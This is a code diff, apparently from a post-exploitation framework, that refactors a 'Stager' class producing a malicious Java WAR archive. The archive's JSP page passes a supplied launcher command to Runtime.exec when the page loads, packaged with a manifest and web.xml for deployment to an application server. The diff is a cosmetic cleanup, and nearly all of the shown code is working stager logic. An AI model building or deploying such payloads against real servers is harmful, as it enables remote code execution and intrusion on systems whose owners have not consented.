@@ -143,23 +143,22 @@ class Stager:
             log.error("Error in launcher command generation.")
             return ""
 
-        else:
-            # .war manifest
-            manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n"
+        # .war manifest
+        manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n"
 
-            # Create initial JSP and Web XML Strings with placeholders
-            jsp_code = (
-                '''<%@ page import="java.io.*" %>
+        # Create initial JSP and Web XML Strings with placeholders
+        jsp_code = (
+            '''<%@ page import="java.io.*" %>
 <%
 Process p=Runtime.getRuntime().exec("'''
-                + str(launcher)
-                + """");
+            + str(launcher)
+            + """");
 %>
 """
-            )
+        )
 
-            # .xml deployment config
-            wxml_code = f"""<?xml version="1.0"?>
+        # .xml deployment config
+        wxml_code = f"""<?xml version="1.0"?>
 <!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd">
@@ -171,13 +170,13 @@ Process p=Runtime.getRuntime().exec("'''
 </web-app>
 """
 
-            # build the in-memory ZIP and write the three files in
-            war_file = io.BytesIO()
-            zip_data = zipfile.ZipFile(war_file, "w", zipfile.ZIP_DEFLATED)
+        # build the in-memory ZIP and write the three files in
+        war_file = io.BytesIO()
+        zip_data = zipfile.ZipFile(war_file, "w", zipfile.ZIP_DEFLATED)
 
-            zip_data.writestr("META-INF/MANIFEST.MF", manifest)
-            zip_data.writestr("WEB-INF/web.xml", wxml_code)
-            zip_data.writestr("%s.jsp" % (app_name), jsp_code)
-            zip_data.close()
+        zip_data.writestr("META-INF/MANIFEST.MF", manifest)
+        zip_data.writestr("WEB-INF/web.xml", wxml_code)
+        zip_data.writestr(f"{app_name}.jsp", jsp_code)
+        zip_data.close()
 
-            return war_file.getvalue()
+        return war_file.getvalue()
